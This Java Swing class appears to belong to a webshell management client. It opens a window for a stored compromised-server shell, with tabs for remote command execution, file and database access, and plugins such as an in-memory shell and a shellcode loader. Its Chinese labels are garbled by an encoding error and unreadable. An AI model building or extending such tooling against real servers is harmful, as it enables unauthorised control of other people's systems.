package core.ui;

import core.ApplicationContext;
import core.Db;
import core.annotation.PluginnAnnotation;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.*;
import util.Log;

import javax.swing.*;
import java.util.HashMap;

public class ShellManage extends JFrame {
    private static final HashMap<String, String> CN_HASH_MAP = new HashMap<>();

    static {
        CN_HASH_MAP.put("MemoryShell", "�ڴ�SHELL");
        CN_HASH_MAP.put("JRealCmd", "�����ն�");
        CN_HASH_MAP.put("CRealCmd", "�����ն�");
        CN_HASH_MAP.put("Screen", "��Ļ��ͼ");
        CN_HASH_MAP.put("CShapDynamicPayload", "ShellCode����");
        CN_HASH_MAP.put("PZipE", "Zip����");
        CN_HASH_MAP.put("CZipE", "Zip����");
        CN_HASH_MAP.put("JZipE", "Zip����");
        CN_HASH_MAP.put("P_Eval_Code", "����ִ��");
        CN_HASH_MAP.put("payload", "��Ч�غ�");
        CN_HASH_MAP.put("secretKey", "��Կ");
        CN_HASH_MAP.put("password", "����");
        CN_HASH_MAP.put("cryption", "������");
        CN_HASH_MAP.put("PROXYHOST", "��������");
        CN_HASH_MAP.put("PROXYPORT", "����˿�");
        CN_HASH_MAP.put("CONNTIMEOUT", "���ӳ�ʱ");
        CN_HASH_MAP.put("READTIMEOUT", "��ȡ��ʱ");
        CN_HASH_MAP.put("PROXY", "��������");
        CN_HASH_MAP.put("REMARK", "��ע");
        CN_HASH_MAP.put("ENCODING", "����");
    }

    private final JTabbedPane tabbedPane;
    private final ShellEntity shellEntity;
    private final HashMap<String, Plugin> pluginMap = new HashMap<>();
    private ShellExecCommandPanel shellExecCommandPanel;
    private ShellBasicsInfo shellBasicsInfo;
    private ShellFileManager shellFileManager;
    private ShellDatabasePanel shellDatabasePanel;

    public ShellManage(String shellId) {
        this.shellEntity = Db.getOneShell(shellId);
        this.tabbedPane = new JTabbedPane();
        String titleString = String.format("Url:%s ��Ч�غ�:%s ������:%s", this.shellEntity.getUrl(), this.shellEntity.getPayload(), this.shellEntity.getCryption());
        this.setTitle(titleString);
        boolean state = this.shellEntity.initShellOperation();
        if (state) {
            this.init();
        } else {
            this.setTitle("��ʼ��ʧ��");
            JOptionPane.showMessageDialog(this, "��ʼ��ʧ��", "��ʾ", JOptionPane.WARNING_MESSAGE);
            this.dispose();
        }

    }

    public static String getCNName(String name) {

        for (String o : CN_HASH_MAP.keySet()) {
            if (o.toUpperCase().equals(name.toUpperCase())) {
                return CN_HASH_MAP.get(o);
            }
        }

        return name;
    }

    private void init() {
        this.shellEntity.setFrame(this);
        this.initComponent();
    }

    private void initComponent() {
        this.tabbedPane.addTab("������Ϣ", this.shellBasicsInfo = new ShellBasicsInfo(this.shellEntity));
        this.tabbedPane.addTab("����ִ��", this.shellExecCommandPanel = new ShellExecCommandPanel(this.shellEntity));
        this.tabbedPane.addTab("�ļ�����", this.shellFileManager = new ShellFileManager(this.shellEntity));
        this.tabbedPane.addTab("���ݿ����", this.shellDatabasePanel = new ShellDatabasePanel(this.shellEntity));
        this.tabbedPane.addTab("�ʼ�", new ShellNote(this.shellEntity));
        this.loadPlugins();
        this.add(this.tabbedPane);
        this.setSize(1300, 600);
        this.setLocationRelativeTo(MainActivity.getFrame());
        this.setVisible(true);
        this.setDefaultCloseOperation(WindowConstants.DISPOSE_ON_CLOSE);
    }

    private String getPluginName(Plugin p) {
        PluginnAnnotation pluginAnnotation = p.getClass().getAnnotation(PluginnAnnotation.class);
        return pluginAnnotation.Name();
    }

    private void loadPlugins() {
        Plugin[] plugins = ApplicationContext.getAllPlugin(this.shellEntity.getPayload());

        for (Plugin value : plugins) {
            try {
                value.init(this.shellEntity);
                this.tabbedPane.addTab(getCNName(this.getPluginName(value)), value.getView());
                this.pluginMap.put(this.getPluginName(value), value);
            } catch (Exception e) {
                Log.error(e);
            }
        }

    }

    public Plugin getPlugin(String pluginName) {
        return this.pluginMap.get(pluginName);
    }
}
